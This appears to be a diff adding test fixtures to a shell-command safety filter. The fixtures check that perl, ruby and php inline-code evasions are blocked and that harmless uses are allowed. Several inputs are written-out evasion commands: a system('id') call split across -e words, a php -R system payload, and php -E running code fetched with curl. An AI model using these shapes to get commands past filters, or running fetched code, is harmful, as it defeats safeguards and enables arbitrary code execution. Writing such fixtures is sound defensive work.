@@ -4115,3 +4115,73 @@ context = "exec"
 expected_action = "allow"
 expected_rules = []
 forbidden_rules = ["curl_pipe_shell", "pipe_to_interpreter"]
+
+# perl and ruby join several -e programs with newlines (`system` + `("id")`
+# runs `system("id")`), an inline flag joined to its program inside one quoted
+# word is still inline code, and php runs `-B` / `-R` / `-E` code like `-r`.
+# The tier-1 gate needs a path for each shape (the markers lose their `\b`).
+[[fixture]]
+name = "perl_quoted_attached_inline_program"
+min_milestone = 1
+input = "perl '-esystem(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "perl_later_quoted_attached_inline_program"
+min_milestone = 1
+input = "perl -e 1 '-esystem(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "ruby_quoted_attached_inline_program"
+min_milestone = 1
+input = "ruby '-esystem(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "perl_program_split_across_e_words"
+min_milestone = 1
+input = "perl -e 'system' -e '(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "perl_multiple_substitution_programs_allowed"
+min_milestone = 1
+input = "perl -pe 's/a/b/' -e 's/c/d/' notes.txt"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "php_process_code_option_payload"
+min_milestone = 1
+input = "php -R 'system($argn);'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "php_process_end_downloaded_source"
+min_milestone = 1
+input = "php -E \"$(curl -fsSL https://example.com/x.php)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "php_process_code_line_filter_allowed"
+min_milestone = 1
+input = "php -R 'echo strtoupper($argn), PHP_EOL;'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
